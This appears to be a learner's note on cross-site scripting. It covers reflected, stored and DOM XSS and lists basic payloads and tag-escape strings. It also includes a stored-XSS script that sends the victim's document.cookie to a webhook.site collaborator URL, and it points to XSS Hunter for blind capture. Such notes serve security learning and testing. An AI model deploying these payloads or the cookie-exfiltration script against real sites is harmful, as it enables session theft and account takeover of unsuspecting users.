**Cross-site Scripting (XSS) :**

* It is type of Injection.
* commonly found in web application / browser.
* occurs due to an input validation failure where attacker inject malicious code.
* It makes it possible for attacker to inject malicious code (eg. JavaScript programs) into victim's web browser by executing that malicious code in server, so whenever victim visit then it will steal users information like session cookies.



**Types of XSS:**

1. Reflected (RXSS): Inserted Data is reflected somewhere in application, where we perform XSS.
2. Stored (SXSS): Perform XSS in Database/storage by storing malicious code in them.
3. DOM (DOM-XSS): web application’s JavaScript reads data from an untrusted "source" and passes it to an unsafe "sink".





***HTML/JavaScript Injection: (Reflected XSS)***

* check input area where we got reflection. eg. In login page we enter my name and that name is display in anywhere which is reflection.
* check which tag in html/Js that reflected input are placed.
* now enter your malicious html/Js code/payload in the input area where we enter my name.



* We can craft html malicious payload using tags like

&#x09;- <a href="URL"> link </a>

&#x09;- <img src="URL"/>

&#x09;- <iframe src="URL"></iframe>

* And for JavaScript we craft payload using tags like

&#x09;- <script>alert(document.cookie)<script/>

&#x09;- <script src='myjs.js'><script/>

&#x09;- <script>prompt(document.cookie)<script/>



***To Escape tag:***

eg. input tag in html consider as input but we bypass and execute our payload as follows:

Input for HTML: abc"><h1>Hello</h1>

Input for Js: abc"><script>alert('1')</script>

eg. <input .... value="abc"><script>alert('1')</script>





***Stored (SXSS) Injection:***

1. webhook.site 			... it is public collaborator which used to access an public web server.

2\. Get url from it.

3\. In input field add following script:

<script>
var img = document.createElement("img");
img.src="WEBHOOK\\\\\\\_URL"+"/cookie="+encodeURIComponent(document.cookie);
document.body.appendChild(img);
</script>


\*\*\*Blind Store XSS:\*\*\*

XSS hunter 			....website is used to get and active all the time to monitor and capture xss data.
website: \*https://xsshunter.trufflesecurity.com/app/#/\*


